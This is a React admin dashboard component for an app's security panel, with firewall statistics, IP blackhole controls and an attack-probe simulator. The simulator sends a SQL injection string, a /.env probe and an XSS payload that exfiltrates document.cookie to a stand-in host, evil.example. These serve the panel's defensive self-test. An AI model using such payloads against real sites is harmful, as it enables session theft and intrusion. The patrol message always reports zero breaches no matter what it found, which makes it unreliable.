import React, { useEffect, useState } from 'react';
import {
  AlertTriangle,
  Ban,
  CheckCircle2,
  KeyRound,
  Lock,
  RefreshCw,
  ShieldAlert,
  ShieldCheck,
  Terminal,
  Unlock,
} from 'lucide-react';
import {
  FismSecurityGridState,
  FismSecurityRedAlert,
} from '../types';

export interface FismSecurityDefensePanelProps {
  onTriggerToast: (msg: string) => void;
}

export const FismSecurityDefensePanel: React.FC<FismSecurityDefensePanelProps> = ({
  onTriggerToast,
}) => {
  const [grid, setGrid] = useState<FismSecurityGridState | null>(null);
  const [loading, setLoading] = useState(true);
  const [patrolling, setPatrolling] = useState(false);
  const [simulatingVector, setSimulatingVector] = useState<string | null>(null);
  const [latestLiveAlert, setLatestLiveAlert] = useState<FismSecurityRedAlert | null>(null);
  const [manualEjectIp, setManualEjectIp] = useState('');
  const [manualEjectReason, setManualEjectReason] = useState('');

  const loadGrid = async () => {
    try {
      const res = await fetch('/api/admin/security-grid');
      if (res.ok) {
        const data = (await res.json()) as FismSecurityGridState;
        setGrid(data);
      }
    } catch {
      // ignore network error
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    void loadGrid();
    const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const ws = new WebSocket(`${proto}//${window.location.host}/ws/community-chat`);
    ws.onmessage = (ev) => {
      try {
        const msg = JSON.parse(String(ev.data || '{}'));
        if (msg?.type === 'security:red_alert' && msg.alert) {
          const alert = msg.alert as FismSecurityRedAlert;
          setLatestLiveAlert(alert);
          setGrid((prev) => {
            if (!prev) return prev;
            const exists = prev.redAlerts.some((a) => a.alertId === alert.alertId);
            return {
              ...prev,
              blockedAttacksTotal: prev.blockedAttacksTotal + (exists ? 0 : 1),
              redAlerts: exists ? prev.redAlerts : [alert, ...prev.redAlerts].slice(0, 60),
            };
          });
          void loadGrid();
        }
      } catch {
        // ignore malformed frame
      }
    };
    return () => {
      try {
        ws.close();
      } catch {
        // ignore
      }
    };
  }, []);

  const handleToggleControl = async (
    field: 'zeroTrustEnabled' | 'autoEjectEnabled' | 'selfHealingEnabled',
    nextVal: boolean,
  ) => {
    try {
      const res = await fetch('/api/admin/security/toggle', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ [field]: nextVal }),
      });
      if (res.ok) {
        const data = (await res.json()) as FismSecurityGridState;
        setGrid(data);
        onTriggerToast(`Updated ${field} → ${nextVal ? 'ENFORCED' : 'PAUSED'}`);
      }
    } catch {
      onTriggerToast('Failed to update defense grid toggle.');
    }
  };

  const handleRunPatrol = async () => {
    setPatrolling(true);
    try {
      const res = await fetch('/api/admin/security/patrol', { method: 'POST' });
      if (res.ok) {
        const data = (await res.json()) as FismSecurityGridState;
        setGrid(data);
        onTriggerToast('108-Layer Deep Patrol complete: 0 breaches detected & vault seals intact.');
      }
    } catch {
      onTriggerToast('Patrol request failed.');
    } finally {
      setPatrolling(false);
    }
  };

  const handleUnban = async (ipOrId: string) => {
    try {
      const res = await fetch('/api/admin/security/unban', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ipOrId }),
      });
      if (res.ok) {
        const data = (await res.json()) as FismSecurityGridState;
        setGrid(data);
        onTriggerToast(`Released ${ipOrId} from Zero-Trust Blackhole.`);
      }
    } catch {
      onTriggerToast('Could not unban target IP.');
    }
  };

  const handleManualEject = async () => {
    if (!manualEjectIp.trim()) {
      onTriggerToast('Enter an IP address to eject and blackhole.');
      return;
    }
    try {
      const res = await fetch('/api/admin/security/eject', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ipAddress: manualEjectIp.trim(),
          reason: manualEjectReason.trim() || 'Manual Admin Threat Blackhole',
        }),
      });
      if (res.ok) {
        const data = (await res.json()) as FismSecurityGridState;
        setGrid(data);
        setManualEjectIp('');
        setManualEjectReason('');
        onTriggerToast(`Ejected & permanently blackholed ${manualEjectIp.trim()}.`);
      }
    } catch {
      onTriggerToast('Manual eject failed.');
    }
  };

  const handleSimulateLiveAttackProbe = async (
    kind: 'sqli' | 'xss' | 'dotfile',
  ) => {
    setSimulatingVector(kind);
    const simIp = `198.51.100.${70 + (kind === 'sqli' ? 1 : kind === 'xss' ? 2 : 3)}`;
    const simHeaders: Record<string, string> = {
      'Content-Type': 'application/json',
      'X-FISM-SIM-ATTACKER-IP': simIp,
      'X-FISM-SIM-DEVICE': `External Attack Simulator (${kind.toUpperCase()})`,
      'X-FISM-SIM-FP': `fp_sim_${kind}`,
    };
    try {
      let res: Response;
      if (kind === 'sqli') {
        res = await fetch(`/api/tracking/event?userId=${encodeURIComponent("' OR 1=1--")}`, {
          method: 'POST',
          headers: simHeaders,
          body: JSON.stringify({ userId: "' OR 1=1--", eventType: 'session_ping' }),
        });
      } else if (kind === 'xss') {
        res = await fetch('/api/tracking/event', {
          method: 'POST',
          headers: simHeaders,
          body: JSON.stringify({
            userId: 'probe_xss',
            commentText: '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>',
            eventType: 'comment',
          }),
        });
      } else {
        res = await fetch('/.env', { method: 'GET', headers: simHeaders });
      }
      const data = await res.json().catch(() => ({}));
      await loadGrid();
      if (res.status === 403) {
        onTriggerToast(
          `Blocked (HTTP 403) at ${data?.layerTriggered || 'Zero-Trust Firewall'} — ${simIp} Auto-Ejected & Red-Alert Dispatched!`,
        );
      } else {
        onTriggerToast(`Probe returned HTTP ${res.status}`);
      }
    } catch {
      onTriggerToast('Firewall probe test failed.');
    } finally {
      setSimulatingVector(null);
    }
  };

  if (loading && !grid) {
    return (
      <div className="fism-card p-6 text-xs font-bold text-[#52607A]">
        Initializing 108-Layer AI Defense &amp; Zero-Trust Firewall Telemetry...
      </div>
    );
  }

  return (
    <div className="space-y-5">
      {/* Persistent Real-Time Emergency Red-Alert Banner */}
      {latestLiveAlert && (
        <div className="rounded-2xl border-2 border-[#DC2626] bg-red-950 text-white p-4 flex items-start justify-between gap-4 shadow-xl">
          <div className="space-y-1">
            <div className="flex items-center gap-2 flex-wrap">
              <span className="px-2 py-0.5 rounded bg-[#DC2626] text-white text-[10px] font-black uppercase tracking-wider">
                ADMIN EMERGENCY RED-ALERT
              </span>
              <span className="font-mono text-[11px] text-red-200 tabular-nums">
                {latestLiveAlert.timestamp}
              </span>
              <span className="px-2 py-0.5 rounded bg-black/40 border border-red-400/40 font-mono text-[10px] text-red-200">
                {latestLiveAlert.encryptedEvidenceHash}
              </span>
            </div>
            <div className="font-extrabold text-sm sm:text-base">
              {latestLiveAlert.threatType} — Auto-Ejected &amp; Blackholed
            </div>
            <div className="text-xs text-red-100 font-mono">
              Attacker IP: {latestLiveAlert.attackerIp} · Device: {latestLiveAlert.deviceName} ·
              Vector: {latestLiveAlert.attemptedVector}
            </div>
          </div>
          <button
            type="button"
            onClick={() => setLatestLiveAlert(null)}
            className="px-3 py-1.5 rounded-lg bg-white/15 hover:bg-white/25 text-xs font-bold shrink-0"
          >
            Acknowledge
          </button>
        </div>
      )}

      {/* Command Header */}
      <div className="fism-card p-5 bg-[#0B1120] text-white border border-slate-700 flex items-center justify-between flex-wrap gap-4">
        <div className="space-y-1">
          <div className="flex items-center gap-2 flex-wrap">
            <span className="px-2.5 py-0.5 rounded bg-[#16A34A] text-white text-[10px] font-extrabold uppercase tracking-wider">
              {grid?.totalDefenseLayers ?? 108}-Layer Neural Defense Grid
            </span>
            <span className="px-2.5 py-0.5 rounded bg-slate-800 border border-slate-700 text-[10px] font-mono text-emerald-300">
              {grid?.encryptionStandard || 'AES-256-GCM + Scrypt'}
            </span>
          </div>
          <h2 className="text-lg sm:text-xl font-extrabold flex items-center gap-2">
            <ShieldAlert className="w-6 h-6 text-[#FF5722]" /> FISM Ultimate AI High-Fi Security &amp;
            Defense Engine
          </h2>
          <p className="text-xs text-slate-300 max-w-2xl">
            Zero-Trust inspection intercepts SQLi, XSS, dotfile probes, RCE, and DDoS bursts before
            route execution, auto-ejects intruders to permanent IP/fingerprint blackhole, seals
            evidence with AES-256-GCM, and dispatches instant Admin Red-Alerts.
          </p>
        </div>

        <button
          type="button"
          onClick={handleRunPatrol}
          disabled={patrolling}
          className="px-4 py-2.5 min-h-[44px] rounded-xl bg-[#FF5722] hover:bg-[#E53935] text-white text-xs font-extrabold flex items-center gap-2 shadow-lg"
        >
          <RefreshCw className={`w-4 h-4 ${patrolling ? 'animate-spin' : ''}`} />
          {patrolling ? 'Sweeping 108 Layers...' : 'Run 108-Layer Deep Patrol'}
        </button>
      </div>

      {/* KPI Strip + Zero-Trust Enforcement Controls */}
      <div className="grid grid-cols-2 lg:grid-cols-4 gap-3">
        <div className="fism-card p-4 border border-[#D8E1F0] dark:border-slate-800">
          <div className="text-[11px] font-bold uppercase text-[#52607A]">Active Defense Layers</div>
          <div className="text-2xl font-black font-mono tabular-nums mt-1 text-[#16A34A]">
            {grid?.totalDefenseLayers ?? 108}
          </div>
          <div className="text-[11px] text-[#52607A] mt-0.5">6 Adaptive Neural Tiers</div>
        </div>
        <div className="fism-card p-4 border border-[#D8E1F0] dark:border-slate-800">
          <div className="text-[11px] font-bold uppercase text-[#52607A]">Intrusions Blocked</div>
          <div className="text-2xl font-black font-mono tabular-nums mt-1 text-[#DC2626]">
            {grid?.blockedAttacksTotal ?? 0}
          </div>
          <div className="text-[11px] text-[#52607A] mt-0.5">
            {grid?.packetsInspectedTotal?.toLocaleString() ?? '0'} packets inspected
          </div>
        </div>
        <div className="fism-card p-4 border border-[#D8E1F0] dark:border-slate-800">
          <div className="text-[11px] font-bold uppercase text-[#52607A]">Blackholed IPs / FP</div>
          <div className="text-2xl font-black font-mono tabular-nums mt-1 text-[#FF5722]">
            {grid?.blackholedEntities.length ?? 0}
          </div>
          <div className="text-[11px] text-[#52607A] mt-0.5">HTTP 403 auto-ejected</div>
        </div>
        <div className="fism-card p-4 border border-[#D8E1F0] dark:border-slate-800">
          <div className="text-[11px] font-bold uppercase text-[#52607A]">Self-Healing Patches</div>
          <div className="text-2xl font-black font-mono tabular-nums mt-1 text-[#2563EB]">
            {grid?.selfHealLogs.length ?? 0}
          </div>
          <div className="text-[11px] text-[#52607A] mt-0.5">Verified intact runtime guards</div>
        </div>
      </div>

      {/* Zero-Trust Enforcement Toggles + Live Firewall Probe Simulator */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
        <div className="fism-card p-4 border border-[#D8E1F0] dark:border-slate-800 space-y-3">
          <h3 className="text-sm font-extrabold flex items-center gap-2">
            <Lock className="w-4 h-4 text-[#16A34A]" /> Zero-Trust Protocol Controls
          </h3>
          <div className="space-y-2">
            {[
              {
                key: 'zeroTrustEnabled' as const,
                label: 'Zero-Trust Global Request Firewall',
                desc: 'Inspect every incoming request & header before route handlers execute.',
                val: grid?.zeroTrustEnabled ?? true,
              },
              {
                key: 'autoEjectEnabled' as const,
                label: 'Auto-Eject & Permanent Blackhole',
                desc: 'Immediately blacklist attacking IP & device fingerprint on SQLi/XSS/Probe.',
                val: grid?.autoEjectEnabled ?? true,
              },
              {
                key: 'selfHealingEnabled' as const,
                label: 'Autonomous Self-Healing Neutralizer',
                desc: 'Seal vulnerable vectors & record verified runtime patches automatically.',
                val: grid?.selfHealingEnabled ?? true,
              },
            ].map((item) => (
              <div
                key={item.key}
                className="p-3 rounded-xl bg-[#F3F6FC] dark:bg-slate-900 border border-[#D8E1F0] dark:border-slate-800 flex items-center justify-between gap-3"
              >
                <div>
                  <div className="text-xs font-extrabold">{item.label}</div>
                  <div className="text-[11px] text-[#52607A]">{item.desc}</div>
                </div>
                <button
                  type="button"
                  onClick={() => handleToggleControl(item.key, !item.val)}
                  className={`px-3.5 py-2 min-h-[40px] rounded-xl text-xs font-extrabold shrink-0 ${
                    item.val ? 'bg-[#16A34A] text-white' : 'bg-[#DC2626] text-white'
                  }`}
                >
                  {item.val ? 'ENFORCING' : 'PAUSED'}
                </button>
              </div>
            ))}
          </div>
        </div>

        <div className="fism-card p-4 border border-[#D8E1F0] dark:border-slate-800 space-y-3">
          <h3 className="text-sm font-extrabold flex items-center gap-2">
            <Terminal className="w-4 h-4 text-[#FF5722]" /> Live Firewall Interception Probe Test
          </h3>
          <p className="text-xs text-[#52607A]">
            Send a real malicious payload via external attacker simulation IP to verify live HTTP
            403 ejection, AES-256-GCM evidence sealing, and instant WS Red-Alert delivery:
          </p>
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
            <button
              type="button"
              disabled={simulatingVector !== null}
              onClick={() => handleSimulateLiveAttackProbe('sqli')}
              className="px-3 py-2.5 min-h-[44px] rounded-xl bg-red-600/10 hover:bg-red-600/20 border border-red-600/40 text-red-700 dark:text-red-300 text-xs font-extrabold"
            >
              {simulatingVector === 'sqli' ? 'Testing...' : "Test SQLi (' OR 1=1--)"}
            </button>
            <button
              type="button"
              disabled={simulatingVector !== null}
              onClick={() => handleSimulateLiveAttackProbe('xss')}
              className="px-3 py-2.5 min-h-[44px] rounded-xl bg-amber-600/10 hover:bg-amber-600/20 border border-amber-600/40 text-amber-700 dark:text-amber-300 text-xs font-extrabold"
            >
              {simulatingVector === 'xss' ? 'Testing...' : 'Test XSS (<script>)'}
            </button>
            <button
              type="button"
              disabled={simulatingVector !== null}
              onClick={() => handleSimulateLiveAttackProbe('dotfile')}
              className="px-3 py-2.5 min-h-[44px] rounded-xl bg-purple-600/10 hover:bg-purple-600/20 border border-purple-600/40 text-purple-700 dark:text-purple-300 text-xs font-extrabold"
            >
              {simulatingVector === 'dotfile' ? 'Testing...' : 'Test Probe (/.env)'}
            </button>
          </div>

          <div className="pt-2 border-t border-[#D8E1F0] dark:border-slate-800 space-y-2">
            <div className="text-xs font-bold">Manual IP Eject &amp; Blackhole</div>
            <div className="flex flex-wrap gap-2">
              <input
                type="text"
                value={manualEjectIp}
                onChange={(e) => setManualEjectIp(e.target.value)}
                placeholder="Attacker IP (e.g. 203.0.113.55)"
                className="flex-1 min-w-[160px] px-3 py-2 rounded-xl bg-[#F3F6FC] dark:bg-slate-900 border border-[#D8E1F0] dark:border-slate-700 text-xs font-mono"
              />
              <input
                type="text"
                value={manualEjectReason}
                onChange={(e) => setManualEjectReason(e.target.value)}
                placeholder="Reason (optional)"
                className="flex-1 min-w-[160px] px-3 py-2 rounded-xl bg-[#F3F6FC] dark:bg-slate-900 border border-[#D8E1F0] dark:border-slate-700 text-xs"
              />
              <button
                type="button"
                onClick={handleManualEject}
                className="px-4 py-2 min-h-[40px] rounded-xl bg-[#DC2626] text-white text-xs font-extrabold flex items-center gap-1.5"
              >
                <Ban className="w-3.5 h-3.5" /> Eject IP
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* 6 Tiers / 108-Layer Matrix */}
      <div className="fism-card p-5 border border-[#D8E1F0] dark:border-slate-800 space-y-3">
        <h3 className="font-extrabold text-sm flex items-center gap-2">
          <ShieldCheck className="w-4 h-4 text-[#16A34A]" /> 108-Layer Adaptive Neural Defense Matrix
        </h3>
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
          {(grid?.defenseTiers || []).map((tier) => (
            <div
              key={tier.tierId}
              className="p-3.5 rounded-xl bg-[#F8FAFE] dark:bg-slate-900 border border-[#D8E1F0] dark:border-slate-800 space-y-2"
            >
              <div className="flex items-center justify-between gap-2">
                <span className="font-mono text-[11px] font-bold text-[#2563EB] tabular-nums">
                  {tier.layerCount} Layers
                </span>
                <span className="px-2 py-0.5 rounded bg-[#16A34A]/15 text-[#16A34A] text-[10px] font-extrabold">
                  {tier.status}
                </span>
              </div>
              <div className="text-xs font-extrabold">{tier.tierName}</div>
              <ul className="space-y-1 text-[11px] text-[#52607A]">
                {tier.highlights.map((h) => (
                  <li key={h} className="flex items-start gap-1.5">
                    <CheckCircle2 className="w-3 h-3 text-[#16A34A] shrink-0 mt-0.5" />
                    <span>{h}</span>
                  </li>
                ))}
              </ul>
            </div>
          ))}
        </div>
      </div>

      {/* Blackholed Intruders Registry */}
      <div className="fism-card p-5 border border-[#D8E1F0] dark:border-slate-800 space-y-3">
        <h3 className="font-extrabold text-sm flex items-center gap-2">
          <Ban className="w-4 h-4 text-[#DC2626]" /> Blackholed IPs &amp; Device Fingerprints (Auto-Ejected)
        </h3>
        {(grid?.blackholedEntities || []).length === 0 ? (
          <p className="text-xs text-[#52607A]">No IPs currently in permanent blackhole.</p>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full text-left text-xs border-collapse">
              <thead>
                <tr className="border-b border-[#D8E1F0] dark:border-slate-800 text-[11px] uppercase text-[#52607A]">
                  <th className="py-2 pr-3">Attacker IP</th>
                  <th className="py-2 pr-3">Device / Fingerprint</th>
                  <th className="py-2 pr-3">Threat Vector</th>
                  <th className="py-2 pr-3">Hits Blocked</th>
                  <th className="py-2 text-right">Admin Action</th>
                </tr>
              </thead>
              <tbody>
                {grid?.blackholedEntities.map((ent) => (
                  <tr
                    key={ent.id}
                    className="border-b border-[#D8E1F0]/60 dark:border-slate-800/60"
                  >
                    <td className="py-2.5 pr-3 font-mono font-bold text-[#DC2626]">
                      {ent.ipAddress}
                    </td>
                    <td className="py-2.5 pr-3">
                      <div className="font-bold">{ent.deviceName}</div>
                      <div className="font-mono text-[10px] text-[#52607A]">
                        {ent.deviceFingerprint} · {ent.blockedAt}
                      </div>
                    </td>
                    <td className="py-2.5 pr-3">
                      <div className="font-semibold">{ent.threatType}</div>
                      <div className="font-mono text-[10px] text-[#52607A] truncate max-w-[260px]">
                        {ent.reason}
                      </div>
                    </td>
                    <td className="py-2.5 pr-3 font-mono font-bold tabular-nums">
                      {ent.blockedRequestsCount}
                    </td>
                    <td className="py-2.5 text-right">
                      <button
                        type="button"
                        onClick={() => handleUnban(ent.ipAddress)}
                        className="px-3 py-1.5 min-h-[36px] rounded-lg bg-[#16A34A] text-white text-[11px] font-extrabold inline-flex items-center gap-1"
                      >
                        <Unlock className="w-3.5 h-3.5" /> Release / Unban
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>

      {/* Encrypted Red-Alert Forensics & Self-Healing Patch Log */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
        <div className="fism-card p-5 border border-[#D8E1F0] dark:border-slate-800 space-y-3">
          <h3 className="font-extrabold text-sm flex items-center gap-2">
            <AlertTriangle className="w-4 h-4 text-[#DC2626]" /> Encrypted Admin Red-Alert Feed
          </h3>
          <div className="space-y-2.5 max-h-[380px] overflow-y-auto pr-1">
            {(grid?.redAlerts || []).map((alert) => (
              <div
                key={alert.alertId}
                className="p-3 rounded-xl bg-[#F3F6FC] dark:bg-slate-900 border border-[#D8E1F0] dark:border-slate-800 space-y-1"
              >
                <div className="flex items-center justify-between gap-2 flex-wrap">
                  <span className="px-2 py-0.5 rounded bg-[#DC2626] text-white text-[10px] font-black">
                    {alert.severity} · {alert.timestamp}
                  </span>
                  <span className="font-mono text-[10px] text-[#16A34A] font-bold">
                    {alert.actionTaken}
                  </span>
                </div>
                <div className="text-xs font-extrabold">{alert.threatType}</div>
                <div className="text-[11px] font-mono text-[#52607A]">
                  IP: {alert.attackerIp} · Device: {alert.deviceName}
                </div>
                <div className="text-[11px] font-mono text-slate-600 dark:text-slate-300 break-all">
                  Vector: {alert.attemptedVector}
                </div>
                <div className="text-[10px] font-mono text-[#7C3AED] flex items-center gap-1">
                  <KeyRound className="w-3 h-3" /> Evidence Seal: {alert.encryptedEvidenceHash}
                </div>
              </div>
            ))}
          </div>
        </div>

        <div className="fism-card p-5 border border-[#D8E1F0] dark:border-slate-800 space-y-3">
          <h3 className="font-extrabold text-sm flex items-center gap-2">
            <ShieldCheck className="w-4 h-4 text-[#2563EB]" /> Autonomous Self-Healing Patch Ledger
          </h3>
          <div className="space-y-2.5 max-h-[380px] overflow-y-auto pr-1">
            {(grid?.selfHealLogs || []).map((heal) => (
              <div
                key={heal.healId}
                className="p-3 rounded-xl bg-[#F8FAFE] dark:bg-slate-900 border border-[#D8E1F0] dark:border-slate-800 space-y-1"
              >
                <div className="flex items-center justify-between gap-2">
                  <span className="font-mono text-[11px] font-bold text-[#2563EB]">
                    {heal.vulnerabilitySignature}
                  </span>
                  <span className="px-2 py-0.5 rounded bg-[#16A34A]/15 text-[#16A34A] text-[10px] font-extrabold">
                    {heal.verificationStatus}
                  </span>
                </div>
                <div className="text-xs font-semibold">{heal.patchApplied}</div>
                <div className="text-[11px] text-[#52607A] font-mono">
                  {heal.targetModule} · {heal.healedAt}
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
};
